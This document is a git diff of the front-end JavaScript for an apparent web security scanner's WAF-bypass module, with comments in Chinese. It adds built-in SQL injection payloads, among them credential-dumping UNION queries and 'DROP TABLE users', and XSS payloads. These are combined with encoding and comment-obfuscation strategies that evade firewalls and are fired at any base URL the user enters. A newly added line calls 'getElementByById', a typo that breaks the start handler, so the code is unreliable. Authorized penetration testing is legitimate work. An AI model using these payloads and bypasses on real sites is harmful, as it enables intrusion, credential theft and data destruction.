@@ -696,101 +696,228 @@ bind('wb-start', async ()=>{
   })
 })
 
-// WAF 绕过
-bind('wf-preset-case', ()=>{
-  const s = document.getElementById('wf-strategies'); if(s) s.value = 'case'
-  const m = document.getElementById('wf-methods'); if(m) m.value = 'GET,POST'
-  const t = document.getElementById('wf-type'); if(t) t.value = 'all'
-  const p = document.getElementById('wf-payloads'); if(p) p.value = 'q=test\nq=1 OR 1=1\nq=<script>alert(1)</script>'
+// WAF 绕过预设策略定义
+const wafPresets = {
+  // SQL注入专用策略
+  sqli: {
+    strategies: 'case,urlencode,doubleencode,tripleencode,space2comment,tab2space,newline2space,split,commentwrap,sqlliteral,sqlchar,nullbyte,capitalize',
+    payloads: '1 OR 1=1\n1\' OR \'1\'=\'1\nadmin\'--\n1 UNION SELECT NULL--\n1\' ORDER BY 1--\n1\' UNION SELECT username,password FROM users--\n1\'; DROP TABLE users--\n1\' OR 1=1 --\n" OR 1=1 --\n\' OR \'x\'=\'x'
+  },
+  // XSS专用策略
+  xss: {
+    strategies: 'case,urlencode,doubleencode,tripleencode,htmlentity,htmlentitydec,unicode,unicodejs,hex,base64,commentinline,nullbyte,nestedtag,eventhandlervariant,protocolrelative',
+    payloads: '<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\njavascript:alert(1)\n<iframe src=javascript:alert(1)>\n<body onload=alert(1)>\n<input onfocus=alert(1) autofocus>\n<select onfocus=alert(1) autofocus>\n<svg><script>alert(1)</script></svg>\n<scr<script>ipt>alert(1)</scr</script>ipt>'
+  },
+  // 大小写混淆
+  'case': {
+    strategies: 'case',
+    payloads: ''
+  },
+  // 编码变形
+  encoding: {
+    strategies: 'urlencode,doubleencode,tripleencode,htmlentity,htmlentitydec,unicode,unicodejs,hex,base64',
+    payloads: ''
+  },
+  // 注释混淆
+  comment: {
+    strategies: 'space2comment,tab2space,newline2space,split,commentinline,commentwrap',
+    payloads: ''
+  },
+  // 全策略
+  all: {
+    strategies: 'case,urlencode,doubleencode,tripleencode,space2comment,tab2space,newline2space,split,commentinline,commentwrap,htmlentity,htmlentitydec,unicode,unicodejs,hex,base64,sqlliteral,sqlchar,nullbyte,capitalize,nestedtag,eventhandlervariant,protocolrelative',
+    payloads: ''
+  }
+}
+
+// 绑定预设按钮
+bind('wf-preset-case', () => {
+  const s = document.getElementById('wf-strategies')
+  const m = document.getElementById('wf-methods')
+  const t = document.getElementById('wf-type')
+  const p = document.getElementById('wf-payloads')
+  if (s) s.value = 'case'
+  if (m) m.value = 'GET,POST'
+  if (t) t.value = 'all'
+  if (p) p.value = ''
 })
-bind('wf-preset-enc', ()=>{
-  const s = document.getElementById('wf-strategies'); if(s) s.value = 'urlencode,doubleencode,htmlentity'
-  const m = document.getElementById('wf-methods'); if(m) m.value = 'GET,POST'
-  const t = document.getElementById('wf-type'); if(t) t.value = 'all'
-  const p = document.getElementById('wf-payloads'); if(p) p.value = 'q=test\nq=1 OR 1=1\nq=<script>alert(1)</script>'
+
+bind('wf-preset-enc', () => {
+  const s = document.getElementById('wf-strategies')
+  const m = document.getElementById('wf-methods')
+  const t = document.getElementById('wf-type')
+  const p = document.getElementById('wf-payloads')
+  if (s) s.value = 'urlencode,doubleencode,tripleencode,htmlentity,htmlentitydec,unicode,unicodejs,hex,base64'
+  if (m) m.value = 'GET,POST'
+  if (t) t.value = 'all'
+  if (p) p.value = ''
 })
-bind('wf-preset-mix', ()=>{
-  const s = document.getElementById('wf-strategies'); if(s) s.value = 'case,urlencode,doubleencode,space2comment,split,htmlentity'
-  const m = document.getElementById('wf-methods'); if(m) m.value = 'GET,POST'
-  const t = document.getElementById('wf-type'); if(t) t.value = 'all'
-  const p = document.getElementById('wf-payloads'); if(p) p.value = 'q=test\nq=1 OR 1=1\nq=<script>alert(1)</script>'
+
+bind('wf-preset-comment', () => {
+  const s = document.getElementById('wf-strategies')
+  const m = document.getElementById('wf-methods')
+  const t = document.getElementById('wf-type')
+  const p = document.getElementById('wf-payloads')
+  if (s) s.value = 'space2comment,tab2space,newline2space,split,commentinline,commentwrap'
+  if (m) m.value = 'GET,POST'
+  if (t) t.value = 'all'
+  if (p) p.value = ''
 })
-bind('wf-start', async ()=>{
+
+bind('wf-preset-sql', () => {
+  const s = document.getElementById('wf-strategies')
+  const m = document.getElementById('wf-methods')
+  const t = document.getElementById('wf-type')
+  const p = document.getElementById('wf-payloads')
+  if (s) s.value = wafPresets.sqli.strategies
+  if (m) m.value = 'GET,POST'
+  if (t) t.value = 'sqli'
+  if (p) p.value = wafPresets.sqli.payloads
+})
+
+bind('wf-preset-xss', () => {
+  const s = document.getElementById('wf-strategies')
+  const m = document.getElementById('wf-methods')
+  const t = document.getElementById('wf-type')
+  const p = document.getElementById('wf-payloads')
+  if (s) s.value = wafPresets.xss.strategies
+  if (m) m.value = 'GET,POST'
+  if (t) t.value = 'xss'
+  if (p) p.value = wafPresets.xss.payloads
+})
+
+bind('wf-preset-all', () => {
+  const s = document.getElementById('wf-strategies')
+  const m = document.getElementById('wf-methods')
+  const t = document.getElementById('wf-type')
+  const p = document.getElementById('wf-payloads')
+  if (s) s.value = wafPresets.all.strategies
+  if (m) m.value = 'GET,POST'
+  if (t) t.value = 'all'
+  if (p) p.value = ''
+})
+
+bind('wf-start', async () => {
   const baseUrl = document.getElementById('wf-base')?.value.trim()
   const path = document.getElementById('wf-path')?.value.trim()
   const payloadType = document.getElementById('wf-type')?.value || 'all'
-  const methods = document.getElementById('wf-methods')?.value.split(',').map(s=>s.trim()).filter(Boolean)
-  const strategies = document.getElementById('wf-strategies')?.value.split(',').map(s=>s.trim()).filter(Boolean)
+  const methods = document.getElementById('wf-methods')?.value.split(',').map(s => s.trim()).filter(Boolean)
+  const strategiesInput = document.getElementByById('wf-strategies')?.value.trim()
+  const strategies = strategiesInput ? strategiesInput.split(',').map(s => s.trim()).filter(Boolean) : []
   const match = document.getElementById('wf-match')?.value.trim()
-  let payloads = document.getElementById('wf-payloads')?.value.split('\n').map(s=>s.trim()).filter(Boolean)
-  const concurrency = parseInt(document.getElementById('wf-conc')?.value)||50
-  const timeoutMs = parseInt(document.getElementById('wf-timeout')?.value)||4000
-  
-  if (!baseUrl || !path || !payloads || payloads.length === 0) {
-    alert('请填写基础URL、路径和Payload')
+  const userPayloads = document.getElementById('wf-payloads')?.value.split('\n').map(s => s.trim()).filter(Boolean)
+  const concurrency = parseInt(document.getElementById('wf-conc')?.value) || 50
+  const timeoutMs = parseInt(document.getElementById('wf-timeout')?.value) || 4000
+
+  if (!baseUrl || !path) {
+    alert('请填写基础URL和路径')
     return
   }
 
-  const isXSS = (s) => /<\s*script\b|javascript\s*:|alert\s*\(/i.test(s)
-  const isSQLi = (s) => /\b(or|union)\b|\bselect\b|--|\/\*|\*\/|#|'/i.test(s)
-  if (payloadType === 'xss') payloads = payloads.filter(isXSS)
-  if (payloadType === 'sqli') payloads = payloads.filter(isSQLi)
-  if (!payloads || payloads.length === 0) {
-    alert('当前类型下没有可用Payload，请检查payload列表或切换类型')
+  // 根据Payload类型检测和过滤
+  const isXSS = (s) => /<\s*script\b|javascript\s*:|alert\s*\(|onerror\s*=|onload\s*=/i.test(s)
+  const isSQLi = (s) => /\b(or|union)\b|\bselect\b|--|\/\*|\*\/|#|'|"\b/i.test(s)
+
+  // 处理Payloads
+  let payloads = []
+  if (userPayloads && userPayloads.length > 0) {
+    // 使用用户输入的Payload，并根据类型过滤
+    if (payloadType === 'xss') {
+      payloads = userPayloads.filter(isXSS)
+    } else if (payloadType === 'sqli') {
+      payloads = userPayloads.filter(isSQLi)
+    } else {
+      payloads = userPayloads
+    }
+  }
+
+  // 如果没有有效Payload且用户没有输入，使用内置库
+  if (payloads.length === 0 && (!userPayloads || userPayloads.length === 0)) {
+    switch (payloadType) {
+      case 'sqli':
+        payloads = wafPresets.sqli.payloads.split('\n').filter(Boolean)
+        break
+      case 'xss':
+        payloads = wafPresets.xss.payloads.split('\n').filter(Boolean)
+        break
+      default:
+        // all类型，使用全部内置Payload
+        payloads = [...wafPresets.sqli.payloads.split('\n').filter(Boolean), ...wafPresets.xss.payloads.split('\n').filter(Boolean)]
+    }
+  }
+
+  if (payloads.length === 0) {
+    if (payloadType === 'sqli') {
+      alert('当前Payload列表中没有检测到SQL注入特征，请检查输入或切换类型')
+    } else if (payloadType === 'xss') {
+      alert('当前Payload列表中没有检测到XSS特征，请检查输入或切换类型')
+    } else {
+      alert('请输入要测试的Payload')
+    }
     return
   }
-  
-  const {taskId} = await api('/scan/waf',{baseUrl,path,payloads,methods,strategies,match,concurrency,timeoutMs})
-  startTask('wf', taskId, (m)=>{
-    if(m.type==='start'||m.type==='progress'){ setProgress('wf', m.percent, m.progress) }
-    if(m.type==='find'){
-      // 确保数据存在
-      const method = m.data.method || 'UNKNOWN';
-      const payload = m.data.payload || '';
-      const variant = m.data.variant || payload || '';
-      const status = m.data.status || 0;
-      const strategies = Array.isArray(m.data.strategies) ? m.data.strategies : [];
-      
-      // 调试日志（可以在浏览器控制台查看）
-      console.log('WAF绕过结果:', { method, payload, variant, status, strategies });
-      
-      // 转义HTML特殊字符
+
+  const requestData = {
+    baseUrl,
+    path,
+    payloadType,
+    methods,
+    strategies,
+    match,
+    payloads,
+    concurrency,
+    timeoutMs
+  }
+  console.log('WAF测试请求:', requestData)
+
+  const { taskId } = await api('/scan/waf', requestData)
+  startTask('wf', taskId, (m) => {
+    if (m.type === 'start' || m.type === 'progress') { setProgress('wf', m.percent, m.progress) }
+    if (m.type === 'find') {
+      const method = m.data.method || 'UNKNOWN'
+      const payload = m.data.payload || ''
+      const variant = m.data.variant || payload || ''
+      const status = m.data.status || 0
+      const strategies = Array.isArray(m.data.strategies) ? m.data.strategies : []
+      const pType = m.data.payloadType || payloadType
+
+      console.log('WAF绕过结果:', { method, payload, variant, status, strategies, payloadType: pType })
+
       const escapeHtml = (text) => {
-        if (!text) return '';
-        const div = document.createElement('div');
-        div.textContent = String(text);
-        return div.innerHTML;
-      };
-      
-      // 显示策略信息（使用与整体风格一致的颜色）
-      const strategiesText = strategies.length > 0 
+        if (!text) return ''
+        const div = document.createElement('div')
+        div.textContent = String(text)
+        return div.innerHTML
+      }
+
+      const strategiesText = strategies.length > 0
         ? `<span class="badge" style="background: rgba(0, 229, 255, 0.15); border-color: rgba(0, 229, 255, 0.5); color: #00e5ff; margin-left: 5px;">策略: ${strategies.join(', ')}</span>`
-        : '';
-      
-      // 始终显示绕过后的payload（使用与整体风格一致的深色主题）
-      // 确保variant完整显示，与靶场后台日志格式一致
+        : ''
+      const typeBadge = pType !== 'all' ? `<span class="badge" style="background: rgba(139, 92, 246, 0.2); border-color: rgba(139, 92, 246, 0.6); color: #a78bfa; margin-left: 5px;">${pType === 'sqli' ? 'SQL注入' : 'XSS'}</span>` : ''
+
       const variantDisplay = `<div style="margin-top: 8px; padding: 10px; background: rgba(17, 24, 39, 0.6); border: 1px solid rgba(16, 185, 129, 0.4); border-left: 3px solid #10b981; border-radius: 6px;">
             <div style="font-weight: bold; color: #10b981; margin-bottom: 6px; font-size: 13px;">✓ 成功绕过的Payload:</div>
             <div class="code" style="background: rgba(0, 0, 0, 0.3); padding: 8px; border-radius: 4px; word-break: break-all; overflow-wrap: break-word; font-family: 'Courier New', monospace; font-size: 13px; white-space: pre-wrap; color: #e5e7eb; border: 1px solid rgba(0, 229, 255, 0.2); max-width: 100%; display: block; box-sizing: border-box;">${escapeHtml(variant)}</div>
-          </div>`;
-      
-      createRow('wf-out','success', 
+          </div>`
+
+      createRow('wf-out', 'success',
         `<div style="width: 100%; max-width: 100%; box-sizing: border-box;">
           <div style="margin-bottom: 8px;">
-            <strong>${escapeHtml(method)}</strong> 
+            <strong>${escapeHtml(method)}</strong>
             <span class="badge" style="margin-left: 8px;">原始: ${escapeHtml(payload)}</span>
+            ${typeBadge}
             ${strategiesText}
           </div>
           ${variantDisplay}
-        </div>`, 
+        </div>`,
         `<span class="badge" style="background: rgba(16, 185, 129, 0.2); border-color: rgba(16, 185, 129, 0.6); color: #10b981; min-width: 60px; text-align: center;">${status}</span>`)
-      
-      // Add to report
+
       addWafScanResult({
         target: baseUrl,
         strategies: strategies.join(','),
+        payloadType: pType,
         result: m.data
-      });
+      })
     }
     if (m.type === 'scan_log') {
       const method = m.data.method || 'UNKNOWN'
@@ -813,7 +940,7 @@ bind('wf-start', async ()=>{
             <div class="code" style="background: rgba(0, 0, 0, 0.3); padding: 8px; border-radius: 4px; word-break: break-all; overflow-wrap: break-word; font-family: 'Courier New', monospace; font-size: 13px; white-space: pre-wrap; color: #e5e7eb; border: 1px solid rgba(255, 193, 7, 0.2); max-width: 100%; display: block; box-sizing: border-box;">${escapeHtml(variant)}</div>
           </div>`
         : ''
-      createRow('wf-out','warn',
+      createRow('wf-out', 'warn',
         `<div style="width: 100%; max-width: 100%; box-sizing: border-box;">
           <div style="margin-bottom: 8px;">
             <strong>${escapeHtml(method)}</strong>
@@ -824,7 +951,7 @@ bind('wf-start', async ()=>{
         </div>`,
         `<span class="badge" style="background: rgba(255, 193, 7, 0.2); border-color: rgba(255, 193, 7, 0.6); color: #fbbf24; min-width: 60px; text-align: center;">${status}</span>`)
     }
-    if(m.type==='end'){ setProgress('wf', 100, m.progress); createRow('wf-out','info', '测试完成', `<span>${m.progress}</span>`) }
+    if (m.type === 'end') { setProgress('wf', 100, m.progress); createRow('wf-out', 'info', '测试完成', `<span>${m.progress}</span>`) }
   })
 })
 
@@ -998,18 +1125,20 @@ function addWafScanResult(data) {
   reportData.wafScan.enabled = true
   reportData.wafScan.target = data.target || ''
   reportData.wafScan.strategies = data.strategies || ''
+  reportData.wafScan.payloadType = data.payloadType || 'all'
   reportData.wafScan.scanTime = new Date().toLocaleString()
   reportData.targets.add(data.target || '')
-  
+
   if (data.result) {
     reportData.wafScan.results.push({
       method: data.result.method,
       payload: data.result.payload,
       variant: data.result.variant,
-      status: data.result.status
+      status: data.result.status,
+      payloadType: data.result.payloadType || data.payloadType || 'all'
     })
   }
-  
+
   updateReportSummary()
   saveReportData()
 }
@@ -1511,9 +1640,12 @@ function exportReport() {
 
   if (reportData.wafScan.enabled && reportData.wafScan.results.length) {
     lines.push('## WAF 绕过')
-    lines.push(`- 目标: ${md(reportData.wafScan.target)} 策略: ${md(reportData.wafScan.strategies)}`)
-    reportData.wafScan.results.forEach(r=>{
-      lines.push(`- ${md(r.method)} ${md(r.payload)} | 变体: \`${md(r.variant)}\` | 状态: ${md(r.status)}`)
+    lines.push(`- 目标: ${md(reportData.wafScan.target)}`)
+    lines.push(`- Payload类型: ${md(reportData.wafScan.payloadType === 'sqli' ? 'SQL注入' : reportData.wafScan.payloadType === 'xss' ? 'XSS跨站脚本' : '全部')}`)
+    lines.push(`- 策略: ${md(reportData.wafScan.strategies)}`)
+    reportData.wafScan.results.forEach(r => {
+      const pType = r.payloadType === 'sqli' ? '[SQLi]' : r.payloadType === 'xss' ? '[XSS]' : ''
+      lines.push(`- ${pType} ${md(r.method)} ${md(r.payload)} | 变体: \`${md(r.variant)}\` | 状态: ${md(r.status)}`)
     })
     lines.push('')
   }
